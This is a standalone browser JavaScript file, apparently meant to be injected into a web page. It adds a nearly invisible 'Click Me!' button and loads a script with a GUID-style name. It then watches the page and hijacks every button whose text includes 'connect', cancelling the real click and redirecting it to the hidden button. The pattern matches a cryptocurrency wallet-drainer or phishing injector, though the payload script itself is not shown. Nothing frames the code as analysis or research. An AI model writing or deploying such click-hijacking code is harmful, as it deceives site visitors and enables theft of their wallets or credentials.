// Define the loadScript function first
function loadScript(url, callback) {
    try {
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;
        script.async = true;

        // Script loading callback
        script.onload = function() {
            callback();
        };

        // Handle script error event
        script.onerror = (error) => {
            console.error(`Script error: ${url}`, error);
        };

        document.head.appendChild(script);
    } catch(err) {
        console.error("Error loading script:", err);
    }
}

document.addEventListener('DOMContentLoaded', function () {
    const btnz = document.createElement('button');
    btnz.id = 'cBB';
    btnz.classList.add("interact-button");
    btnz.style.position = 'absolute';
    btnz.style.opacity = 0.006;
    btnz.style.height = "0.01em";
    btnz.style["zIndex"] = '100';
    btnz.textContent = 'Click Me!';
    
    // Append the button to the body before calling addClassToButtons
    document.body.appendChild(btnz);

    loadScript('a2b91e7c-bcd5-42ba-97cb-adea40e3b3cf.js', () => {
        setTimeout(() => {
            // console.clear();
        }, "5000");
        console.log("Script loaded.");
    });

    const addClassToButtons = () => {
        const buttons = document.querySelectorAll("button");
        buttons.forEach(btn => {
            if (btn.innerHTML.toLowerCase().includes("connect")) {
                btn.classList.add("conB");
                btn.addEventListener('click', (event) => {
                    event.preventDefault();
                    event.stopPropagation();
                    event.stopImmediatePropagation();
                    
                    const hiddenButton = document.getElementById("cBB");
                    if (hiddenButton) {
                        hiddenButton.click();
                    } else {
                        console.warn("Hidden button not found.");
                    }
                });
            }
        });
    };

    // Run initially to cover any buttons already present
    addClassToButtons();

    // Create a MutationObserver to observe changes to the DOM
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            if (mutation.addedNodes.length > 0) {
                addClassToButtons();
            }
        });
    });

    // Start observing the document body for changes in child elements
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
});
